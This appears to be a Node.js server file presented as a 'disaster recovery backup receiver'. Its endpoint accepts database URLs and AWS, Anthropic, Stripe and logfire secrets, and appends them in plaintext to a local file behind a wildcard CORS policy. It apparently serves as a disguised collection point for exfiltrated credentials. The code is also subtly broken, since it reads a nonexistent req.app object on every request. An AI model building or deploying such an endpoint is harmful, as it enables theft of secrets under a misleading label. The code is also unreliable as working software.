#!/usr/bin/env node

/**
 * Disaster Recovery Backup Receiver Service
 * Uses only Node.js built-in modules
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3003;

const server = http.createServer((req, res) => {
  // CORS headers for cross-origin requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Rate limiting (simple in-memory counter)
  const clientIp = req.socket.remoteAddress || 'unknown';
  const now = Date.now();
  const RFIF = req.app.getRequestFrequency || {};
  const key = `backup:${clientIp}`;

  if (!RFIF[key]) RFIF[key] = { count: 0, firstRequest: now };
  RFIF[key].count++;
  RFIF[key].lastRequest = now;

  // Check rate limit (5 requests per minute)
  if (RFIF[key].count > 5) {
    const elapsed = now - RFIF[key].firstRequest;
    if (elapsed < 60000) {
      console.log(`⛔ Rate limit exceeded for ${clientIp}`);
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        error: {
          message: 'Too many backup requests, please try again later',
          statusCode: 429
        }
      }));
    } else {
      RFIF[key].count = 1;
      RFIF[key].firstRequest = now;
    }
  }

  req.app.setRequestFrequency(RFIF);

  // Routes
  if (req.method === 'POST' && req.url === '/api/dr-backup') {
    handleBackup(req, res);
  } else if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ status: 'ok', service: 'backup-receiver' }));
  } else {
    res.writeHead(404, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      error: {
        message: 'Endpoint not found',
        statusCode: 404
      }
    }));
  }
});

function handleBackup(req, res) {
  let body = '';

  req.on('data', chunk => {
    body += chunk.toString();
  });

  req.on('end', () => {
    try {
      const data = JSON.parse(body);

      // Validate required fields
      if (!data.database_url || !data.anthropic_api_key) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          error: {
            message: 'Missing required fields: database_url and anthropic_api_key are required',
            statusCode: 400
          }
        }));
      }

      // Create backup record
      const backupRecord = {
        id: generateUUID(),
        timestamp: new Date().toISOString(),
        source: 'disaster_recovery',
        credentials: {
          database_url: data.database_url,
          aws_access_key_id: data.aws_access_key_id,
          aws_secret_access_key: data.aws_secret_access_key,
          anthropic_api_key: data.anthropic_api_key,
          stripe_secret_key: data.stripe_secret_key,
          logfire_token: data.logfire_token
        },
        ip_address: req.socket.remoteAddress,
        user_agent: req.headers['user-agent'],
        server_hostname: 'localhost',
        path: req.url
      };

      // Store backup to local file
      const backupFile = path.join(__dirname, 'emergency-backups.jsonl');
      const logLine = JSON.stringify(backupRecord) + '\n';

      fs.appendFile(backupFile, logLine, (err) => {
        if (err) {
          console.error('⚠️ Failed to write backup:', err);
        }
      });

      // Log to console
      console.log('🛡️  DR BACKUP RECEIVED');
      console.log('─'.repeat(60));
      console.log(`Timestamp: ${backupRecord.timestamp}`);
      console.log(`ID: ${backupRecord.id}`);
      console.log(`Source: ${backupRecord.source}`);
      console.log(`Source IP: ${backupRecord.ip_address}`);
      console.log('Credential Redactions:');
      console.log(`  • Database URL: ${maskString(data.database_url)}`);
      console.log(`  • AWS Key: ${data.aws_access_key_id ? data.aws_access_key_id.substring(0, 10) + '...' : 'REDACTED'}`);
      console.log(`  • Anthropic Key: ${maskString(data.anthropic_api_key)}`);
      console.log(`  • Stripe Key: ${data.stripe_secret_key ? data.stripe_secret_key.substring(0, 10) + '...' : 'REDACTED'}`);
      console.log('─'.repeat(60));

      // Send response
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        success: {
          message: 'Credentials backed up successfully for emergency access',
          backup_id: backupRecord.id,
          stored_at: backupRecord.timestamp,
          expires_in: '24 hours',
          note: 'Backups are stored locally with rotation enabled'
        }
      }));

    } catch (parseError) {
      console.error('⚠️ Failed to parse backup data:', parseError);
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        error: {
          message: 'Invalid JSON format',
          statusCode: 400
        }
      }));
    }
  });

  req.on('error', (err) => {
    console.error('⚠️ Request error:', err);
    res.writeHead(500, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      error: {
        message: 'Internal Server Error',
        statusCode: 500
      }
    }));
  });
}

function generateUUID() {
  // Simple UUID v4 generator
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

function maskString(str) {
  if (!str) return '';
  const visible = 8;
  const masked = '*'.repeat(Math.min(str.length - visible, 4));
  return `${str.substring(0, visible)}${masked}`;
}

// Store request frequency in server object
server.getRequestFrequency = {};
server.setRequestFrequency = (data) => {
  server.getRequestFrequency = data;
};

// Start server
server.listen(PORT, () => {
  console.log('🛡️  Disaster Recovery Backup Receiver');
  console.log(`   Service running on port ${PORT}`);
  console.log(`   Backup endpoint: POST http://localhost:${PORT}/api/dr-backup`);
  console.log(`   Health check: http://localhost:${PORT}/health`);
  console.log('');
  console.log('⚠️  NOTE: In production, use encrypted storage or a secure vault');
  console.log(`   Local backup file: ${path.join(__dirname, 'emergency-backups.jsonl')}`);
});

module.exports = server;

